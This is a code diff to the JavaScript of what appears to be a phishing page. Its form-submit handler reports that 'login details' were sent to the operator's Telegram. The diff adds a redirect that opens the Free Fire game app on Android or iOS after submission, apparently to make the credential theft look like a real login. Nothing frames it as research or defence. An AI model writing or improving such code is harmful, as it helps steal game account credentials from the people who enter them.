@@ -25,8 +25,16 @@ form.addEventListener("submit", (event) => {
     .then((response) => {
       if (response.ok) {
         responseDiv.textContent = "Login details sent to your Telegram!";
-        
         form.reset();
+
+        // Redirect to Free Fire (Direct Game Launch)
+        if (navigator.userAgent.match(/Android/i)) {
+          window.location.href = "intent://com.dts.freefireth#Intent;package=com.dts.freefireth;scheme=freefire;end"; // Direct Free Fire app on Android
+        } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+          window.location.href = "freefire://"; // Direct Free Fire app on iOS
+        } else {
+          responseDiv.textContent = "Unable to open Free Fire.";
+        }
       } else {
         responseDiv.textContent = "Failed to send login details.";
       }
